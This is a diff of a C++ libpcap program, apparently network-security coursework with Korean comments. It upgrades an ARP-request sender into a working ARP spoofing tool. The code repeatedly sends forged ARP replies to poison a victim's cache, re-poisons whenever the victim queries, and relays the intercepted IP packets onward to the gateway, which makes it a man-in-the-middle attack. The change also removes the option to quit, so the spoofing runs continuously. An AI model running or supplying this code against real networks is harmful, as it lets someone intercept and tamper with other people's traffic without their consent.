@@ -3,23 +3,31 @@
 #include <sys/ioctl.h>
 #include <net/if.h>
 #include <unistd.h>
+#include <signal.h>
 #include <iso646.h>
 #include <vector>
 #include <map>
+#include <set>
 #include <thread>
 #include "ethhdr.h"
 #include "arphdr.h"
+#include "iphdr.h"
 using namespace std;
 vector<pair<Ip, Ip>> spoof_ip;
 map<Ip, Mac> Arp_table;
-bool loop = true;
+Ip my_ip;
+Mac my_mac;
 
 struct EthArpPacket final
 {
     EthHdr eth_;
     ArpHdr arp_;
 };
-
+struct EthIpPacket final
+{
+    EthHdr eth_;
+    IpHdr ip_;
+};
 Ip get_my_IP(const char *ifr)
 {
     int sockfd;
@@ -79,10 +87,10 @@ int send_ARP_packet(pcap_t *handle, EthArpPacket packet)
     }
     return res;
 }
-int send_IP_packet(pcap_t *handle, const u_char *packet, int size)
+int send_IP_packet(pcap_t *handle, const u_char *packet, pcap_pkthdr *header)
 {
     //ip의 경우 뒤에 msg가 있으므로 size가 고정되지 않음. u_char*로 전달해야 함
-    int res = pcap_sendpacket(handle, packet, size);
+    int res = pcap_sendpacket(handle, packet, header->caplen);
     if (res != 0)
     {
         fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
@@ -160,26 +168,29 @@ Mac get_MAC_by_ARP(pcap_t *handle, const EthArpPacket sendpk)
     exit(-1);
 }
 
-void infect(pcap_t *handle, Ip my_ip, Mac my_mac)
+void infect(pcap_t *handle)
 {
     //예상치 못한 이유로 끊길 수 있으므로 주기적으로 infect
-    //몇초마다 재감염할까요? 일단 10초
-    while (loop)
+    //몇초마다 재감염할까요? 일단 30초
+    while (1)
     {
         for (auto iter : spoof_ip)
         {
-            EthArpPacket spoof_packet = make_ARP_REPLY(my_mac, Arp_table[iter.first], iter.second, iter.first);
-            send_ARP_packet(handle, spoof_packet);
+            EthArpPacket spoof_packet1 = make_ARP_REPLY(my_mac, Arp_table[iter.first], iter.second, iter.first);
+            //EthArpPacket spoof_packet2 = make_ARP_REPLY(my_mac, Arp_table[iter.second], iter.first, iter.second);
+            send_ARP_packet(handle, spoof_packet1);
+            //send_ARP_packet(handle, spoof_packet2);
+            sleep(1); //한꺼번에 많은 packet 보내면 packet loss 가능성 있음
         }
-        sleep(10);
+        sleep(30);
     }
 }
-void receive(pcap_t *handle, Ip my_ip, Mac my_mac)
+void receive(pcap_t *handle)
 {
-    struct pcap_pkthdr *header;
-    const u_char *packet;
-    while (loop)
+    while (1)
     {
+        struct pcap_pkthdr *header;
+        const u_char *packet;
         //reply 수신
         int res = pcap_next_ex(handle, &header, &packet);
         if (res == 0)
@@ -190,10 +201,11 @@ void receive(pcap_t *handle, Ip my_ip, Mac my_mac)
             break;
         }
 
-        EthArpPacket *ARPpacket = (EthArpPacket *)packet;
+        EthHdr *Ethpacket = (EthHdr *)packet;
         //arp_request이면 재감염
-        if (ntohs(ARPpacket->eth_.type_) == EthHdr::Arp)
+        if (ntohs(Ethpacket->type_) == EthHdr::Arp)
         {
+            EthArpPacket *ARPpacket = (EthArpPacket *)packet;
             if (ntohs(ARPpacket->arp_.op_) not_eq ArpHdr::Request)
                 continue;
             for (auto iter : spoof_ip)
@@ -202,26 +214,29 @@ void receive(pcap_t *handle, Ip my_ip, Mac my_mac)
                     continue;
                 if (ntohl(ARPpacket->arp_.tip_) not_eq iter.second)
                     continue;
-                EthArpPacket spoof_packet = make_ARP_REPLY(my_mac, Arp_table[iter.first], iter.second, iter.first);
-                sleep(1); //너무 빨리 보내면 arp table이 정상 reply에 overwrite됨
-                send_ARP_packet(handle, spoof_packet);
-                break;
+                //sender와 target 모두에게 packet을 날려 양방향 flow 모두를 감염
+                //하면 안돼요..ㅠㅠ
+                EthArpPacket spoof_packet1 = make_ARP_REPLY(my_mac, Arp_table[iter.first], iter.second, iter.first);
+                //EthArpPacket spoof_packet2 = make_ARP_REPLY(my_mac, Arp_table[iter.second], iter.first, iter.second);
+                sleep(1);
+                send_ARP_packet(handle, spoof_packet1);
+                //send_ARP_packet(handle, spoof_packet2);
             }
         }
         //ip이면 relay
-        //EthArpPacket*로 접근해도 어차피 arp 부분은 건드리지 않아서 괜찮
-        if (ntohs(ARPpacket->eth_.type_) == EthHdr::Ip4)
+        //Iphdr class를 만들고 EthIpPacket로 접근
+        if (ntohs(Ethpacket->type_) == EthHdr::Ip4)
         {
+            EthIpPacket *Ippacket = (EthIpPacket *)packet;
             for (auto iter : spoof_ip)
             {
-                if (ARPpacket->eth_.smac_ not_eq Arp_table[iter.first])
+                if (Ippacket->eth_.smac_ not_eq Arp_table[iter.first])
                     continue;
-                if (ARPpacket->eth_.dmac_ not_eq my_mac)
+                if (Ippacket->eth_.dmac_ not_eq my_mac)
                     continue;
-                ARPpacket->eth_.smac_ = my_mac; //my_mac을 보내야 CAM table이 깨지지 않음
-                ARPpacket->eth_.dmac_ = Arp_table[iter.second];
-                send_IP_packet(handle, packet, header->caplen);
-                break;
+                Ippacket->eth_.smac_ = my_mac; //my_mac을 보내야 CAM table이 깨지지 않음
+                Ippacket->eth_.dmac_ = Arp_table[iter.second];
+                send_IP_packet(handle, packet, header);
             }
         }
     }
@@ -232,14 +247,15 @@ int main(int argc, char *argv[])
     //매개변수 확인(4개보다 작거나 불완전 입력인지)
     if ((argc < 4) or (argc % 2))
     {
-        printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
-        printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
+        printf("syntax : arp-spoof <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
+        printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1\n");
         return -1;
     }
 
     //pcap_open
     char errbuf[PCAP_ERRBUF_SIZE];
-    pcap_t *handle = pcap_open_live(argv[1], PCAP_ERRBUF_SIZE, 1, 1, errbuf);
+    //여기 BUFSIZ 대신 PCAP_ERRBUF_SIZE 하면 인터넷 연결 안됨
+    pcap_t *handle = pcap_open_live(argv[1], BUFSIZ, 1, 1, errbuf);
     if (handle == nullptr)
     {
         fprintf(stderr, "couldn't open device %s(%s)\n", argv[1], errbuf);
@@ -248,16 +264,19 @@ int main(int argc, char *argv[])
 
     //attacker(me)의 ip, mac 주소 알아내기
     //함수 반환형을 각각 Ip, Mac으로 수정
-    Ip my_ip = get_my_IP(argv[1]);
-    Mac my_mac = get_my_MAC(argv[1]);
+    my_ip = get_my_IP(argv[1]);
+    my_mac = get_my_MAC(argv[1]);
     // printf("attacker_ip: %s\n", string(my_ip).c_str());
     // printf("attacker_mac: %s\n", string(my_mac).c_str());
 
     //sender(victim, you)와 target(gateway)의 mac 주소 알아내기
     //<sip, tip>로 각각의 spoof_table을 만들고 map<Ip, Mac>으로 Mac 주소 저장(Arp_table 구현)
+    //<sender, target>, <target, sender>를 모두 저장하려고 했으나
+    //target -> sender의 reply는 packet size가 너무 커서 relay 불가능
     for (int i = 1; i < argc / 2; i++)
     {
         spoof_ip.push_back({Ip(argv[2 * i]), Ip(argv[2 * i + 1])});
+        //spoof_ip.push_back({Ip(argv[2 * i + 1]), Ip(argv[2 * i])});
         if (not Arp_table.count(Ip(argv[2 * i])))
         {
             EthArpPacket sender_packet = make_ARP_REQUEST(my_mac, my_ip, Ip(argv[2 * i]));
@@ -276,16 +295,9 @@ int main(int argc, char *argv[])
     //스레드 사용법은 https://modoocode.com/269을 참고
     //1. 감염시키는 스레드
     //2. 릴레이하는 스레드
-    thread t1(infect, handle, my_ip, my_mac);
-    thread t2(receive, handle, my_ip, my_mac);
+    thread t1(infect, handle);
+    thread t2(receive, handle);
 
-    //q 입력하면 스레드 종료
-    printf("'q'를 입력하면 프로그램이 종료됩니다.\n");
-    printf("종료까지 최대 10초가 걸리므로 기다려주시기 바랍니다.\n");
-    char input;
-    while (getchar() not_eq 'q')
-        ;
-    loop = false;
     t1.join();
     t2.join();
 
